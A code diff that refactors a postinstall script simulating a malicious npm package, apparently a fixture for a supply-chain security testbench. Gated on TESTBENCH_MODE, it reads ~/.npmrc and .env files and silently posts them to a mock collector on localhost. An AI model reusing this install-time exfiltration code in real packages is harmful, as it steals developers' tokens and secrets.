@@ -1,17 +1,45 @@
 /**
  * MALICIOUS POSTINSTALL SCRIPT
  * This executes automatically when the workspace package is installed
- * 
+ *
  * SAFETY: Only works in TESTBENCH_MODE
  */
 
-if (process.env.TESTBENCH_MODE === 'enabled') {
-  const http = require('http');
+function postCapture(data) {
+  return new Promise((resolve) => {
+    const http = require('http');
+    const payload = JSON.stringify(data);
+    const req = http.request(
+      {
+        hostname: '127.0.0.1',
+        port: 3000,
+        path: '/collect',
+        method: 'POST',
+        headers: {
+          'Content-Type': 'application/json',
+          'Content-Length': Buffer.byteLength(payload)
+        }
+      },
+      (res) => {
+        res.resume();
+        res.on('end', () => resolve());
+      }
+    );
+    req.on('error', () => resolve());
+    req.write(payload);
+    req.end();
+  });
+}
+
+async function main() {
+  if (process.env.TESTBENCH_MODE !== 'enabled') {
+    return;
+  }
+
   const fs = require('fs');
   const path = require('path');
   const os = require('os');
 
-  // Collect system information
   const data = {
     timestamp: new Date().toISOString(),
     package: '@devcorp/utils',
@@ -24,51 +52,30 @@ if (process.env.TESTBENCH_MODE === 'enabled') {
     cwd: process.cwd(),
     workspaceRoot: path.resolve(__dirname, '../..'),
     env: {
-      NODE_ENV: process.env.NODE_ENV,
+      NODE_ENV: process.env.NODE_ENV
     },
     files: {}
   };
 
-  // Try to read sensitive files from workspace root
   const workspaceRoot = path.resolve(__dirname, '../..');
   const sensitiveFiles = [
     path.join(os.homedir(), '.npmrc'),
     path.join(workspaceRoot, '.env'),
     path.join(workspaceRoot, '.env.local'),
-    path.join(workspaceRoot, 'package.json'),
+    path.join(workspaceRoot, 'package.json')
   ];
 
-  sensitiveFiles.forEach(filePath => {
+  sensitiveFiles.forEach((filePath) => {
     try {
       if (fs.existsSync(filePath)) {
         data.files[filePath] = fs.readFileSync(filePath, 'utf8');
       }
-    } catch (e) {
+    } catch (_) {
       // Silently fail
     }
   });
 
-  // Exfiltrate data to mock server (127.0.0.1 avoids ::1/IPv4 mismatch on some Linux CI runners)
-  const payload = JSON.stringify(data);
-  const options = {
-    hostname: '127.0.0.1',
-    port: 3000,
-    path: '/collect',
-    method: 'POST',
-    headers: {
-      'Content-Type': 'application/json',
-      'Content-Length': payload.length
-    }
-  };
-
-  const req = http.request(options, () => {
-    // Data sent successfully
-  });
-
-  req.on('error', () => {
-    // Silently fail
-  });
-
-  req.write(payload);
-  req.end();
+  await postCapture(data);
 }
+
+main().catch(() => {});
